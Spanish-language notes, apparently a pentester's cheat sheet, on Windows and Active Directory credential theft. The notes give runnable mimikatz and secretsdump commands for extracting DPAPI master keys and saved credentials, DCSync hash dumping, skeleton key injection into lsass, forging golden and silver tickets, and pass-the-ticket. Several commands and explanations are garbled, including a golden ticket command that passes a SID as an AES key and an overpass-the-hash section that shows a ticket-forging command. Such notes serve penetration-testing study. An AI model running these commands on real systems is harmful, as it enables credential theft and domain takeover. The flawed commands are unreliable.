# CREDENTIAL ACCESS (WINDOWS LOCAL):

## DPAPI:
Es el "protocolo" usado por microsoft en base a una "mastek key" con la que se puedan descrifrar y cifrar datos por los desarrolladores, por ejemplo los navegadores pueden cifrar las contraseñas en base a DPAPI, un dato importante es que la Master Key puede variar en base a la contraseña del usuario.

### Get Master key:
Lo más comun es que con mimikatz lo podamos conseguir, la key usualmente esta almacenada en:

- C:\Users\USER\AppData\Roaming\Microsoft\Protect\
- C:\Users\USER\AppData\Local\Microsoft\Protect

NOTA:
- Roaming (AppData\Roaming\Protect): Los datos y claves almacenados aquí se pueden sincronizar entre diferentes dispositivos cuando el usuario tiene un perfil móvil, permitiendo que los datos protegidos sean accesibles en cualquier dispositivo del dominio.
- Local (AppData\Local\Protect): Los datos y claves se limitan al dispositivo donde fueron generados, por lo que solo serán accesibles en esa máquina específica.

Dentro de estas carpetas encontraremos otra carpeta con un SID, donde contiene el fichero con una denominación szGuid.

La primer tarea es justamente encontrar la ruta completa, que debemos usar cmd al ser ficheros ocultos.
```
> dir /a:h C:\Users\USER\AppData\Roaming\Microsoft\Protect\<S-1-5-21-3097112084-1706841912-3560390538-1000>\
> dir /a:h C:\Users\USER\AppData\Roaming\Microsoft\Protect\<S-1-5-21-3097112084-1706841912-3560390538-1000>\
```

El valor del SID variara entre dispositivos.

Obtenida la ruta completa podemos extraer el master key.
```
mimikatz> dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\S-1-5-21-3097112084-1706841912-3560390538-1000\313fbe20-e5fd-2609-33d3-6b085b58e987" /sid:S-1-5-21-3097112084-1706841912-3560390538-1000 /password:contraseñaejemplo /protected
(...)
[masterkey] with password: contraseñaejemplo (protected user)
  key : cc1f3539ee123435cd425b87b3adb9ce5fe043ed7d7d3892a88093879fa348f1e0d0102eff9c19ca32a7f001450e7417353258abf48deeccac78ddc390d28be8
  sha1: dc1038(...)
```

Despues ya teniendo la masterkey podemos descrifrar los datos aparte, o con el mismo mimikatz, podemos buscar las credenciales guardadas en el windows "Credential Manager" donde se almacenan por ejemplo las contraseñas de RDP.
```
> dpapi::cred /in:C:\Users\USER\AppData\Roaming\Microsoft\Credentials\98A34CA2D99C1CEBB9365414C74839F1 
(...)
 TargetName     : Domain:target=testin.home
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : prueba
  CredentialBlob : prueba
  Attributes     : 0
> dpapi::cred /in:C:\Users\USER\AppData\Roaming\Microsoft\Credentials\98A34CA2D99C1CEBB9365414C74839F1 /masterkey:cc1f3539ee123435cd425b87b3adb9ce5fe043ed7d7d3892a88093879fa348f1e0d0102eff9c19ca32a7f001450e7417353258abf48deeccac78ddc390d28be8
```

**Considerar que pueden haber multiples masterkey.**

# CREDENTIAL ACCESS (DOMAIN):

## DCSYNC:
Proceso de replicación nativa de servidores AD en windows, donde se requieren un usario con permisos:

- DS-Replication-Get-Changes
- Replicating Directory Changes All
- Replicating Directory Changes In Filtered Set

Ya sea para un usuario, o para un servidor AD que este dentro de un grupo con permisos asignados.

La explotación puede ser tanto local y remoto.

### Local:
```
lsadump::dcsync /user:dcorp o krbtgt(u otro usuario pero en este caso el hash de ntlm de usuario krbtgt es el requerido para emitir golden tickets)
```

### Remoto:
```
> secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
```

NOTA: un escenario que podriamos toparnos en un pentest es... 
1- Conseguir un usuario y contraseña del AD con solo permisos de replicación.
2- Con estos permisos obtengamos la replicación (HASH NTML) de un usuario elevador como el de krbtgt.
3- En base a este usuario krbtgt logremos emitir goldentickets del domain admin.

## Key Skeleton attack:
En resumen el ataque es "sencillo", lo que se hace es modificar mediante una inyección en memoria a lsass (encargado de la autenticación) haciendo que ademas de permitir la autenticación por medio de la contraseña guardada en el AD, tambien permita la autenticación con una "master key" inyectada.
Esto hace que el atacante pueda autenticarse con la master key usando cualquier usuario, teniendo permanencia hasta que el AD se reinicie o el proceso inyectado sea matado.
```
mimikatz> privilege::debug
mimikatz> misc::skeleton

Empire:dc> usemodule powershell/persistence/misc/skeleton_key 
```

## KERBEROS ATTACK:

### Proceso simplificado de emisión de tickets:

- (Usuario) → envía: Credenciales (nombre de usuario y contraseña cifrada) → (Authentication Service, AS parte del Key Distribution Center (KDC))
- (AS) → emite: Ticket Granting Ticket (TGT) → (Usuario, almacena el ticket localmente)
- (Usuario) → envía: TGT → al (Ticket Granting Service - TGS, parte del Key Distribution Center (KDC))
- (TGS) → emite: Service Ticket (ST) → (Usuario, almacena el ticket localmente)
- (Usuario) → envía: Service Ticket (ST) → (Servidor de servicio unido a dominio)

### Proceso sobre simplificado de emisión de tickets:
1- (Usuario) → envía: Contraseña → (AS) → emite: TGT
2- (Usuario) → envía: TGT → (TGS) → emite: Service Ticket (ST)
3- (Usuario) → envía: Service Ticket (ST) → (Servicio de servidor unido a dominio)

### Terminos comunes:
- Ticket Granting Ticket = Golden Ticket, ticket que permite emitir Services Tickets.
- Service Ticket = Silver Ticket, ticket que permite autenticarse en servidores unidos a dominios en un servicio en particular,
- KRBTGT = Usuario interno del Key Distribution Center (KDC) unico que tiene la llave de cifrado valida para firmar los tickets, ni un domain admin puede firmar tickets.
- Service Principal Name (SPN) = Nombre que representa a una instancia de un servicio en la red. Se usa en entornos de autenticación Kerberos para identificar el servicio al que quieres acceder, con formato <tipo_de_servicio>/<nombre_servidor>:<puerto>
  - Ejemplo: HTTP/servidorweb.dominio.com - MSSQLSvc/servidordb.dominio.com:1433

### Ataques comunes en kerberos:

#### Golden ticket attack:
El proceso puede variar pero basicamente es obtener un ticket de tipo TGT.

1- Obtener el hash de krbtgt:
- lsadump::dcsync /domain:domain name /user:krbtgt

2- Usar pass the hash a la cuenta de krbtgt para emitir TGT:
- kerberos::golden /domain:domain name /aes256:SID /rc4:KRBTGT-hash-value /id:value /user:username
- se guardara el ticket como ticket.kirbi

#### Silver ticket attack:
El proceso se basa en que sí obtienes el hash NTLM de de un servicio, puedes firmar en base a este hash el ticket, creando un servicio de TGS falso, emitiendo un ST con incluso un usuario falso, que cuando se envia al servidor con el servicio, no va y valida con el KDC que el ST sea valido, simplemente lo descifra usando su hash NTLM y acepta la conexión.

¿Y sí ya tenemos el hash ntlm porque no simplemente me autentico usando el hash? Usar un ST falsificado tiene ventajas como:


| **Aspecto**                        | **Usar Contraseña/Hash NTLM**             | **Silver Ticket Attack**                      |
|------------------------------------|-------------------------------------------|-----------------------------------------------|
| **Interacción con el KDC**         | Requiere autenticación con el KDC         | No interactúa con el KDC                      |
| **Rastro en logs del KDC**         | Sí, deja registros                        | No deja rastro en el KDC                      |
| **Privilegios**                    | Limitado a los privilegios reales de la cuenta | Control sobre los privilegios en el ticket    |
| **Duración del acceso**            | Depende de la sesión y autenticación       | Puedes generar tickets con larga duración     |
| **Detección**                      | Más fácil de detectar (actividad en los logs) | Más difícil de detectar (sin interacción KDC) |
| **Reutilización del acceso**       | Autenticación repetida con credenciales   | Ticket persistente, reutilizable              |

Comando en mimikatz:
```
Mimikatz> kerberos::golden /domain:dominio.local /sid:S-1-5-21-xxxxxxxxxx /target:servidorweb.dominio.local /service:HTTP /rc4:hash_ntlm_servicio /user:usuario_falso /id:500
```

NOTA: No necesitamos acceso al AD ni descifrar el hash ntlm, incluso no es necesario ejecutar el comando en el servidor comprometido, dado que nosotros falsificaremos el TGS, por lo que podemos ejecutarlo en un windows que no este unido a dominio, solo se requiere conexión al servicio, que en este caso es **servidorweb.dominio.local** 

#### Pass the Ticket:
Robo de ticket tipo ST o TGT de un equipo ya autenticado en la red, para despues el ticket pasado al KDC o servicio para autenticarse.
```
kerberos::list (listar)
kerberos::list /export (listar y exportar)
kerberos::list /export /tgt
kerberos::list /export /service:service_name
```
Inyectar el ticket robado:
```
kerberos::ptt <ruta_al_ticket.kirbi>
```

#### Over Pass The Hash / Pass The Key:
Ataque basado en solicitar un TGT por medio del hash NTLM del usuario al KDC.

En este caso se puede dumpear el NTLM o obtenerse por reponder, para despues 

```
kerberos::golden /user:usuario /domain:dominio.local /sid:S-1-5-21-xxxxxxxxxx /rc4:hash_ntlm /target:servidor.dominio.local /ticket
```
NOTA: La ventaja de este ataque es que puedes ejecutar mimikatz desde una VM que no esta unida a dominio, solo necesitas alcanzar al AD para que sí esta mal configurado puedas pedir TGT.



























